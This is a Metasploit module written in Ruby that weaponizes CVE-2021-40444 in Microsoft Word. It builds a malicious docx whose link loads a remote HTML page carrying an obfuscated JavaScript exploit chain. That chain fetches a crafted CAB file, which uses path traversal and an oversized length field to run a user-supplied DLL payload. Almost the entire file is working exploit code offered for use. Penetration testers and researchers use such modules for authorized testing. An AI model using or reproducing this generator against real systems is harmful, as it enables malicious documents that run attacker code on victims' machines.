##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microsoft Office Word Malicious MSHTML Injector',
        'Description' => %q{
          This module creates a malicious docx file that when opened in vulnerable versions of Microsoft Word will lead
          to code execution. This vulnerability exists because an attacker could craft a malicious ActiveX control to be
          used by a Microsoft Office document that hosts the browser rendering engine.
        },
        'References' => [
          ['CVE', '2021-40444'],
          ['URL', 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444'],
          ['URL', 'https://www.sentinelone.com/blog/peeking-into-cve-2021-40444-ms-office-zero-day-vulnerability-exploited-in-the-wild/'],
          ['URL', 'http://download.microsoft.com/download/4/d/a/4da14f27-b4ef-4170-a6e6-5b1ef85b1baa/[ms-cab].pdf'],
          ['URL', 'https://github.com/lockedbyte/CVE-2021-40444/blob/master/REPRODUCE.md'],
          ['URL', 'https://github.com/klezVirus/CVE-2021-40444']
        ],
        'Author' => [
          'lockedbyte ', # Vulnerability discovery.
          'klezVirus ', # References and PoC.
          'thesunRider', # Official Metasploit exploit module.
          'mekhalleh (RAMELLA Sébastien)', # Zeop-CyberSecurity - Auxiliary injector module.
        ],
        'DisclosureDate' => '2021-09-23',
        'License' => MSF_LICENSE,
        'DefaultOptions' => {
          'SRVPORT' => 443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [UNRELIABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptPath.new('CUSTOMTEMPLATE', [false, 'A DOCX file that will be used as a template to build the exploit.']),
      OptString.new('FILENAME', [true, 'The Office document file (docx)', 'msf.docx']),
      OptBool.new('OBFUSCATE', [true, 'Obfuscate JavaScript content.', true]),
      OptPath.new('PAYLOAD_DLL', [true, 'The DLL payload file path to run.']),
      OptString.new('PAYLOAD_PREFIX', [false, 'The payload prefix to be requested by the exploit chain. Default: Randomized.']),
      OptString.new('PAYLOAD_URI', [true, 'The payload base path to be requested by the exploit chain.', '/']),
      OptString.new('SRVHOST', [true, 'The remote host/ip to request the payload.']),
      OptString.new('SRVPORT', [true, 'The remote host port number (TCP).']),
      OptBool.new('SSL', [true, 'Negotiate SSL/TLS for outgoing payload request.'])
    ])
  end

  def bin_to_hex(bstr)
    return(bstr.each_byte.map { |b| b.to_s(16).rjust(2, '0') }.join)
  end

  def cab_checksum(data, seed = "\x00\x00\x00\x00")
    checksum = seed

    bytes = ''
    data.chars.each_slice(4).map(&:join).each do |dword|
      if dword.length == 4
        checksum = checksum.unpack('C*').zip(dword.unpack('C*')).map { |a, b| a ^ b }.pack('C*')
      else
        bytes = dword
      end
    end
    checksum = checksum.reverse

    case (data.length % 4)
    when 3
      dword = "\x00#{bytes}"
    when 2
      dword = "\x00\x00#{bytes}"
    when 1
      dword = "\x00\x00\x00#{bytes}"
    else
      dword = "\x00\x00\x00\x00"
    end

    checksum = checksum.unpack('C*').zip(dword.unpack('C*')).map { |a, b| a ^ b }.pack('C*').reverse
  end

  # http://download.microsoft.com/download/4/d/a/4da14f27-b4ef-4170-a6e6-5b1ef85b1baa/[ms-cab].pdf
  def create_cab(data)
    cab_cfdata = ''
    filename = "../#{@payload_prefix}.inf"
    block_size = 32768
    struct_cffile = 0xd
    struct_cfheader = 0x30

    block_counter = 0
    data.chars.each_slice(block_size).map(&:join).each do |block|
      block_counter += 1

      seed = "#{[block.length].pack('S')}#{[block.length].pack('S')}"
      csum = cab_checksum(block, seed)

      vprint_status("Data block added w/ checksum: #{bin_to_hex(csum)}")
      cab_cfdata << csum                     # uint32 {4} - Checksum
      cab_cfdata << [block.length].pack('S') # uint16 {2} - Compressed Data Length
      cab_cfdata << [block.length].pack('S') # uint16 {2} - Uncompressed Data Length
      cab_cfdata << block
    end

    cab_size = [
      struct_cfheader +
        struct_cffile +
        filename.length +
        cab_cfdata.length
    ].pack('L<')

    # CFHEADER (http://wiki.xentax.com/index.php/Microsoft_Cabinet_CAB)
    cab_header = "\x4D\x53\x43\x46" # uint32 {4} - Header (MSCF)
    cab_header << "\x00\x00\x00\x00" # uint32 {4} - Reserved (null)
    cab_header << cab_size # uint32 {4} - Archive Length
    cab_header << "\x00\x00\x00\x00"         # uint32 {4} - Reserved (null)

    cab_header << "\x2C\x00\x00\x00"         # uint32 {4} - Offset to the first CFFILE
    cab_header << "\x00\x00\x00\x00"         # uint32 {4} - Reserved (null)
    cab_header << "\x03"                     # byte   {1} - Minor Version (3)
    cab_header << "\x01"                     # byte   {1} - Major Version (1)
    cab_header << "\x01\x00"                 # uint16 {2} - Number of Folders
    cab_header << "\x01\x00"                 # uint16 {2} - Number of Files
    cab_header << "\x00\x00"                 # uint16 {2} - Flags

    cab_header << "\xD2\x04"                 # uint16 {2} - Cabinet Set ID Number
    cab_header << "\x00\x00"                 # uint16 {2} - Sequential Number of this Cabinet file in a Set

    # CFFOLDER
    cab_header << [                          # uint32 {4} - Offset to the first CFDATA in this Folder
      struct_cfheader +
      struct_cffile +
      filename.length
    ].pack('L<')
    cab_header << [block_counter].pack('S<') # uint16 {2} - Number of CFDATA blocks in this Folder
    cab_header << "\x00\x00"                 # uint16 {2} - Compression Format for each CFDATA in this Folder (1 = MSZIP)

    # increase file size to trigger vulnerability
    cab_header << [ # uint32 {4} - Uncompressed File Length ("\x02\x00\x5C\x41")
      data.length + 1073741824
    ].pack('L<')

    # set current date and time in the format of cab file
    date_time = Time.new
    date = [((date_time.year - 1980) << 9) + (date_time.month << 5) + date_time.day].pack('S')
    time = [(date_time.hour << 11) + (date_time.min << 5) + (date_time.sec / 2)].pack('S')

    # CFFILE
    cab_header << "\x00\x00\x00\x00"         # uint32 {4} - Offset in the Uncompressed CFDATA for the Folder this file belongs to (relative to the start of the Uncompressed CFDATA for this Folder)
    cab_header << "\x00\x00"                 # uint16 {2} - Folder ID (starts at 0)
    cab_header << date                       # uint16 {2} - File Date (\x5A\x53)
    cab_header << time                       # uint16 {2} - File Time (\xC3\x5C)
    cab_header << "\x20\x00"                 # uint16 {2} - File Attributes
    cab_header << filename                   # byte   {X} - Filename (ASCII)
    cab_header << "\x00"                     # byte   {1} - null Filename Terminator

    cab_stream = cab_header

    # CFDATA
    cab_stream << cab_cfdata
  end

  def generate_html
    target_uri = "#{@proto}://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}#{normalize_uri("#{datastore['PAYLOAD_URI']}/#{@payload_prefix}.cab")}"

    # original HTML PoC (may need some overhaul)
    js_content = %|var a0_0x127f=['123','365952KMsRQT','tiveX','/Lo','./../../','contentDocument','ppD','Dat','close','Acti','removeChild','mlF','write','./A','ata/','ile','../','body','setAttribute','#version=5,0,0,0','ssi','iframe','748708rfmUTk','documentElement','lFile','location','159708hBVRtu','a/Lo','Script','document','call','contentWindow','emp','Document','Obj','prototype','lfi','bject','send','appendChild','Low/#{@payload_prefix}.inf','htmlfile','115924pLbIpw','GET','p/#{@payload_prefix}.inf','1109sMoXXX','./../A','htm','l/T','cal/','1wzQpCO','ect','w/#{@payload_prefix}.inf','522415dmiRUA','#{target_uri}','88320wWglcB','XMLHttpRequest','#{@payload_prefix}.inf','Act','D:edbc374c-5730-432a-b5b8-de94f0b57217','open','<bo','HTMLElement','/..','veXO','102FePAWC'];function a0_0x15ec(_0x329dba,_0x46107c){return a0_0x15ec=function(_0x127f75,_0x15ecd5){_0x127f75=_0x127f75-0xaa;var _0x5a770c=a0_0x127f[_0x127f75];return _0x5a770c;},a0_0x15ec(_0x329dba,_0x46107c);}(function(_0x59985d,_0x17bed8){var _0x1eac90=a0_0x15ec;while(!![]){try{var _0x2f7e2d=parseInt(_0x1eac90(0xce))+parseInt(_0x1eac90(0xd8))*parseInt(_0x1eac90(0xc4))+parseInt(_0x1eac90(0xc9))*-parseInt(_0x1eac90(0xad))+parseInt(_0x1eac90(0xb1))+parseInt(_0x1eac90(0xcc))+-parseInt(_0x1eac90(0xc1))+parseInt(_0x1eac90(0xda));if(_0x2f7e2d===_0x17bed8)break;else _0x59985d['push'](_0x59985d['shift']());}catch(_0x34af1e){_0x59985d['push'](_0x59985d['shift']());}}}(a0_0x127f,0x5df71),function(){var _0x2ee207=a0_0x15ec,_0x279eab=window,_0x1b93d7=_0x279eab[_0x2ee207(0xb4)],_0xcf5a2=_0x279eab[_0x2ee207(0xb8)]['prototype']['createElement'],_0x4d7c02=_0x279eab[_0x2ee207(0xb8)]['prototype'][_0x2ee207(0xe5)],_0x1ee31c=_0x279eab[_0x2ee207(0xd5)][_0x2ee207(0xba)][_0x2ee207(0xbe)],_0x2d20cd=_0x279eab[_0x2ee207(0xd5)][_0x2ee207(0xba)][_0x2ee207(0xe3)],_0x4ff114=_0xcf5a2['call'](_0x1b93d7,_0x2ee207(0xac));try{_0x1ee31c[_0x2ee207(0xb5)](_0x1b93d7[_0x2ee207(0xea)],_0x4ff114);}catch(_0x1ab454){_0x1ee31c[_0x2ee207(0xb5)](_0x1b93d7[_0x2ee207(0xae)],_0x4ff114);}var _0x403e5f=_0x4ff114[_0x2ee207(0xb6)]['ActiveXObject'],_0x224f7d=new _0x403e5f(_0x2ee207(0xc6)+_0x2ee207(0xbb)+'le');_0x4ff114[_0x2ee207(0xde)]['open']()[_0x2ee207(0xe1)]();var _0x371a71='p';try{_0x2d20cd[_0x2ee207(0xb5)](_0x1b93d7[_0x2ee207(0xea)],_0x4ff114);}catch(_0x3b004e){_0x2d20cd['call'](_0x1b93d7['documentElement'],_0x4ff114);}function _0x2511dc(){var _0x45ae57=_0x2ee207;return _0x45ae57(0xcd);}_0x224f7d['open']()[_0x2ee207(0xe1)]();var _0x3e172f=new _0x224f7d[(_0x2ee207(0xb3))][(_0x2ee207(0xd1))+'iveX'+(_0x2ee207(0xb9))+(_0x2ee207(0xca))]('htm'+_0x2ee207(0xaf));_0x3e172f[_0x2ee207(0xd3)]()[_0x2ee207(0xe1)]();var _0xd7e33d='c',_0x35b0d4=new _0x3e172f[(_0x2ee207(0xb3))]['Ac'+(_0x2ee207(0xdb))+'Ob'+'ject']('ht'+_0x2ee207(0xe4)+_0x2ee207(0xe8));_0x35b0d4[_0x2ee207(0xd3)]()[_0x2ee207(0xe1)]();var _0xf70c6e=new _0x35b0d4['Script'][(_0x2ee207(0xe2))+(_0x2ee207(0xd7))+(_0x2ee207(0xbc))]('ht'+'mlF'+_0x2ee207(0xe8));_0xf70c6e[_0x2ee207(0xd3)]()[_0x2ee207(0xe1)]();var _0xfed1ef=new ActiveXObject('htmlfile'),_0x5f3191=new ActiveXObject(_0x2ee207(0xc0)),_0xafc795=new ActiveXObject(_0x2ee207(0xc0)),_0x5a6d4b=new ActiveXObject('htmlfile'),_0x258443=new ActiveXObject('htmlfile'),_0x53c2ab=new ActiveXObject('htmlfile'),_0x3a627b=_0x279eab[_0x2ee207(0xcf)],_0x2c84a8=new _0x3a627b(),_0x220eee=_0x3a627b[_0x2ee207(0xba)][_0x2ee207(0xd3)],_0x3637d8=_0x3a627b[_0x2ee207(0xba)][_0x2ee207(0xbd)],_0x27de6f=_0x279eab['setTimeout'];_0x220eee[_0x2ee207(0xb5)](_0x2c84a8,_0x2ee207(0xc2),_0x2511dc(),![]),_0x3637d8[_0x2ee207(0xb5)](_0x2c84a8),_0xf70c6e[_0x2ee207(0xb3)][_0x2ee207(0xb4)][_0x2ee207(0xe5)](_0x2ee207(0xd4)+'dy>');var _0x126e83=_0xcf5a2[_0x2ee207(0xb5)](_0xf70c6e['Script'][_0x2ee207(0xb4)],'ob'+'je'+'ct');_0x126e83[_0x2ee207(0xeb)]('co'+'de'+'ba'+'se',_0x2511dc()+_0x2ee207(0xaa));var _0x487bfa='l';_0x126e83[_0x2ee207(0xeb)]('c'+'la'+_0x2ee207(0xab)+'d','CL'+'SI'+_0x2ee207(0xd2)),_0x1ee31c[_0x2ee207(0xb5)](_0xf70c6e[_0x2ee207(0xb3)]['document']['body'],_0x126e83),_0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)]='.'+_0xd7e33d+_0x371a71+_0x487bfa+':'+'123',_0xfed1ef[_0x2ee207(0xb3)]['location']='.'+_0xd7e33d+_0x371a71+_0x487bfa+':'+_0x2ee207(0xd9),_0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)]='.'+_0xd7e33d+_0x371a71+_0x487bfa+':'+_0x2ee207(0xd9),_0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)]='.'+_0xd7e33d+_0x371a71+_0x487bfa+':'+_0x2ee207(0xd9),_0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)]='.'+_0xd7e33d+_0x371a71+_0x487bfa+':'+'123',_0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)]='.'+_0xd7e33d+_0x371a71+_0x487bfa+':'+_0x2ee207(0xd9),_0xfed1ef['Script']['location']='.'+_0xd7e33d+_0x371a71+_0x487bfa+':'+_0x2ee207(0xd9),_0xfed1ef[_0x2ee207(0xb3)]['location']='.'+_0xd7e33d+_0x371a71+_0x487bfa+':'+_0x2ee207(0xd9),_0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)]='.'+_0xd7e33d+_0x371a71+_0x487bfa+':'+'123',_0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)]='.'+_0xd7e33d+_0x371a71+_0x487bfa+':'+'..'+'/.'+_0x2ee207(0xc5)+_0x2ee207(0xdf)+_0x2ee207(0xe7)+'Lo'+_0x2ee207(0xc8)+'T'+_0x2ee207(0xb7)+_0x2ee207(0xdc)+_0x2ee207(0xcb),_0x5f3191[_0x2ee207(0xb3)][_0x2ee207(0xb0)]='.'+_0xd7e33d+_0x371a71+_0x487bfa+':.'+'./'+'..'+'/.'+_0x2ee207(0xe6)+'pp'+_0x2ee207(0xe0)+'a/Lo'+'ca'+_0x2ee207(0xc7)+'em'+'p/#{@payload_prefix}.inf',_0xafc795[_0x2ee207(0xb3)][_0x2ee207(0xb0)]='.'+_0xd7e33d+_0x371a71+_0x487bfa+':'+'..'+_0x2ee207(0xd6)+'/.'+'./../A'+_0x2ee207(0xdf)+_0x2ee207(0xe7)+'Lo'+_0x2ee207(0xc8)+'T'+_0x2ee207(0xb7)+_0x2ee207(0xdc)+'w/#{@payload_prefix}.inf',_0x5a6d4b[_0x2ee207(0xb3)][_0x2ee207(0xb0)]='.'+_0xd7e33d+_0x371a71+_0x487bfa+':.'+'./'+_0x2ee207(0xe9)+'..'+'/.'+_0x2ee207(0xe6)+'pp'+'Dat'+_0x2ee207(0xb2)+'ca'+'l/T'+'em'+_0x2ee207(0xc3),_0x258443[_0x2ee207(0xb3)]['location']='.'+_0xd7e33d+_0x371a71+_0x487bfa+':'+'..'+_0x2ee207(0xd6)+'/.'+_0x2ee207(0xdd)+'T'+_0x2ee207(0xb7)+_0x2ee207(0xdc)+_0x2ee207(0xcb),_0x5a6d4b['Script'][_0x2ee207(0xb0)]='.'+_0xd7e33d+_0x371a71+_0x487bfa+':.'+'./'+'../'+'..'+'/.'+'./../T'+'em'+'p/#{@payload_prefix}.inf',_0x5a6d4b[_0x2ee207(0xb3)]['location']='.'+_0xd7e33d+_0x371a71+_0x487bfa+':'+_0x2ee207(0xe9)+_0x2ee207(0xe9)+_0x2ee207(0xbf),_0x5a6d4b[_0x2ee207(0xb3)]['location']='.'+_0xd7e33d+_0x371a71+_0x487bfa+':'+'../'+_0x2ee207(0xe9)+_0x2ee207(0xd0);}());|

    if datastore['OBFUSCATE']
      print_line('    - obfuscate JavaScript content')
      js_content = Rex::Exploitation::JSObfu.new js_content
      js_content = js_content.obfuscate(memory_sensitive: false)
    end

    html = '<!DOCTYPE html><html><head><meta http-equiv="Expires" content="-1"><meta http-equiv="X-UA-Compatible" content="IE=11"></head><body><script>'
    html += js_content.to_s
    html += '</script></body></html>'

    html
  end

  def get_file_in_docx(fname)
    i = @docx.find_index { |item| item[:fname] == fname }

    unless i
      fail_with(Failure::NotFound, "This template cannot be used because it is missing: #{fname}")
    end

    @docx.fetch(i)[:data]
  end

  def get_template_path
    datastore['CUSTOMTEMPLATE'] || File.join(Msf::Config.data_directory, 'exploits', 'cve-2021-40444.docx')
  end

  def inject_docx
    document_xml = get_file_in_docx('word/document.xml')
    unless document_xml
      fail_with(Failure::NotFound, 'This template cannot be used because it is missing: word/document.xml')
    end

    document_xml_rels = get_file_in_docx('word/_rels/document.xml.rels')
    unless document_xml_rels
      fail_with(Failure::NotFound, 'This template cannot be used because it is missing: word/_rels/document.xml.rels')
    end

    uri = "#{@proto}://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}#{normalize_uri("#{datastore['PAYLOAD_URI']}/#{@payload_prefix}.html")}"
    @docx.each do |entry|
      case entry[:fname]
      when 'word/document.xml'
        entry[:data] = document_xml.to_s.gsub!('TARGET_HERE', uri.to_s)
      when 'word/_rels/document.xml.rels'
        entry[:data] = document_xml_rels.to_s.gsub!('TARGET_HERE', "mhtml:#{uri}!x-usc:#{uri}")
      end
    end
  end

  def normalize_uri(*strs)
    new_str = strs * '/'

    new_str = new_str.gsub!('//', '/') while new_str.index('//')

    # makes sure there's a starting slash
    unless new_str[0, 1] == '/'
      new_str = '/' + new_str
    end

    new_str
  end

  def pack_docx
    @docx.each do |entry|
      if entry[:data].is_a?(Nokogiri::XML::Document)
        entry[:data] = entry[:data].to_s
      end
    end

    Msf::Util::EXE.to_zip(@docx)
  end

  def unpack_docx(template_path)
    document = []

    Zip::File.open(template_path) do |entries|
      entries.each do |entry|
        if entry.name.match(/\.xml|\.rels$/i)
          content = Nokogiri::XML(entry.get_input_stream.read) if entry.file?
        elsif entry.file?
          content = entry.get_input_stream.read
        end

        vprint_status("Parsing item from template: #{entry.name}")

        document << { fname: entry.name, data: content }
      end
    end

    document
  end

  def write_file(path_to_file, data, mode = 'w')
    file_handle = File.open(path_to_file, mode)
    file_handle.write(data)
    file_handle.close

    print_good("#{File.basename(path_to_file)} stored at #{path_to_file}")
  end

  def run
    if !datastore['PAYLOAD_DLL'].downcase.match(/\.dll$/i)
      fail_with(Failure::BadConfig, 'The payload file path is not valid!')
    end

    @proto = (datastore['SSL'] ? 'https' : 'http')
    if datastore['PAYLOAD_PREFIX'].nil? || datastore['PAYLOAD_PREFIX'].empty?
      @payload_prefix = Rex::Text.rand_text_alpha(4..8)
    else
      @payload_prefix = datastore['PAYLOAD_PREFIX']
    end

    print_status('CVE-2021-40444: Generate a malicious cabinet file')
    if File.exist?(datastore['PAYLOAD_DLL']) && !File.zero?(datastore['PAYLOAD_DLL'])
      mz = File.binread(datastore['PAYLOAD_DLL'])
    else
      fail_with(Failure::BadConfig, 'Could not open the payload file!')
    end
    write_file(File.join(Msf::Config.local_directory, "#{@payload_prefix}.cab"), create_cab(mz), 'wb')

    print_status('CVE-2021-40444: Generate a malicious html file')
    write_file(File.join(Msf::Config.local_directory, "#{@payload_prefix}.html"), generate_html, 'wb')

    print_status('CVE-2021-40444: Generate a malicious docx file')

    template_path = get_template_path
    unless File.extname(template_path).match(/\.docx$/i)
      fail_with(Failure::BadConfig, 'Template is not a docx file!')
    end

    print_line("    - using template '#{template_path}'")
    @docx = unpack_docx(template_path)

    print_line('    - injecting payload in docx document')
    inject_docx

    print_line("    - finalizing docx '#{datastore['FILENAME']}'")
    file_create(pack_docx)
  end

end
